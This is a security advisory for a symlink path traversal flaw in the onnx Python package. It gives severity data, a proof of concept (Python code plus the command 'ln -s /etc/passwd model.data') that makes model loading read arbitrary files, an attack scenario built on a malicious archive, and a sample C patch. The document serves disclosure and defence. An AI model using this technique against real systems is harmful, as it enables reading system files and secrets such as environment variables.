# [H] onnx Vulnerable to Path Traversal via Symlink

## Summary
Severity: High
Advisory: GHSA-3r9x-f23j-gc73
CVE: CVE-2026-27489
CWE: CWE-23, CWE-61
Ecosystem: PyPI
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-03-31
Source: https://github.com/advisories/GHSA-3r9x-f23j-gc73
Type: github-advisory

## Affected
- PyPI: `onnx` — affected >=0 <1.21.0

## Details
### Summary
A path traversal vulnerability via symlink allows to read arbitrary files outside model or user-provided directory. 

### Details
The following check for symlink is ineffective and it is possible to point a symlink to an arbitrary location on the file system:
https://github.com/onnx/onnx/blob/336652a4b2ab1e530ae02269efa7038082cef250/onnx/checker.cc#L1024-L1033

`std::filesystem::is_regular_file` performs a `status(p)` call on the provided path, which follows symbolic links to determine the file type, meaning it will return true if the target of a symlink is a regular file. 


### PoC



```python
# Create a demo model with external data
import os
import numpy as np
import onnx
from onnx import helper, TensorProto, numpy_helper

def create_onnx_model(output_path="model.onnx"):
    weight_matrix = np.random.randn(1000, 1000).astype(np.float32)

    X = helper.make_tensor_value_info("X", TensorProto.FLOAT, [1, 1000])
    Y = helper.make_tensor_value_info("Y", TensorProto.FLOAT, [1, 1000])
    W = numpy_helper.from_array(weight_matrix, name="W")

    matmul_node = helper.make_node("MatMul", inputs=["X", "W"], outputs=["Y"], name="matmul")

    graph = helper.make_graph(
        nodes=[matmul_node],
        name="SimpleModel",
        inputs=[X],
        outputs=[Y],
        initializer=[W]
    )

    model = helper.make_model(graph, opset_imports=[helper.make_opsetid("", 11)])
    onnx.checker.check_model(model)

    data_file = output_path.replace('.onnx', '.data')

    if os.path.exists(output_path):
        os.remove(output_path)
    if os.path.exists(data_file):
        os.remove(data_file)

    onnx.save_model(
        model,
        output_path,
        save_as_external_data=True,
        all_tensors_to_one_file=True,
        location=os.path.basename(data_file),
        size_threshold=1024 * 1024
    )

if __name__ == "__main__":
    create_onnx_model("model.onnx")
```

1. Run the above code to generate a sample model with external data.
2. Remove `model.data`
3. Run `ln -s /etc/passwd model.data`
4. Load the model using the following code
5. Observe check for symlink is bypassed and model is succesfuly loaded

```python
import onnx
from onnx.external_data_helper import load_external_data_for_model

def load_onnx_model_basic(model_path="model.onnx"):
    model = onnx.load(model_path)
    return model

def load_onnx_model_explicit(model_path="model.onnx"):
    model = onnx.load(model_path, load_external_data=False)
    load_external_data_for_model(model, ".")
    return model

if __name__ == "__main__":
    model = load_onnx_model_basic("model.onnx")

```

A common misuse case for successful exploitation is that an adversary can provide victim with a compressed file, containing `poc.onnx` and `poc.data (symlink)`. Once the victim uncompress and load the model, symlink read the adversary selected arbitrary file.


### Impact

Read sensitive and arbitrary files and environment variable (e.g. /proc/1/environ) from the host that loads the model.

NOTE: this issue is not limited to UNIX.

### Sample patch

```c
#include <fcntl.h>
#include <sys/stat.h>
#include <unistd.h>
#include <errno.h>

int open_external_file_no_symlink(const char *base_dir,
                                  const char *relative_path) {
    int dirfd = -1;
    int fd = -1;
    struct stat st;

    // Open base directory
    dirfd = open(base_dir, O_RDONLY | O_DIRECTORY);
    if (dirfd < 0) {
        return -1;
    }

    // Open the target relative to base_dir
    // O_NOFOLLOW => fail if final path component is a symlink
    fd = openat(dirfd,
                relative_path,
                O_RDONLY | O_NOFOLLOW);
    close(dirfd);

    if (fd < 0) {
        // ELOOP is the typical error if a symlink is encountered
        return -1;
    }

    // Inspect the *opened file*
    if (fstat(fd, &st) != 0) {
        close(fd);
        return -1;
    }

    // Enforce "regular file only"
    if (!S_ISREG(st.st_mode)) {
        close(fd);
        errno = EINVAL;
        return -1;
    }

    // fd is now:
    // - not a symlink
    // - not a directory
    // - not a device / FIFO / socket
    // - race-safe
    return fd;
}
```

### Resources

* https://cwe.mitre.org/data/definitions/61.html
* https://discuss.secdim.com/t/input-validation-necessary-but-not-sufficient-it-doesnt-target-the-fundamental-issue/1172
* https://discuss.secdim.com/t/common-pitfalls-for-patching-path-traversal/3368

## References
- https://github.com/onnx/onnx/security/advisories/GHSA-3r9x-f23j-gc73
- https://nvd.nist.gov/vuln/detail/CVE-2026-27489
- https://github.com/onnx/onnx/commit/4755f8053928dce18a61db8fec71b69c74f786cb
- https://github.com/onnx/onnx
